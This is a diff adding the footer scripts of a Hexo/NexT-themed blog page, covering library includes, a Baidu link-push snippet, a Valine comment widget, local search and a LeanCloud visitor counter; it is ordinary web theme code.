+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '96DbJ7Tj8LDwhvF03Pcfymwl-gzGzoHsz',
+        appKey: 'DuUSj4dTajY34cjKfwsbgBJB',
+        placeholder: '如有不当，敬请指出 email:1473788702@qq.com',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("96DbJ7Tj8LDwhvF03Pcfymwl-gzGzoHsz", "DuUSj4dTajY34cjKfwsbgBJB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
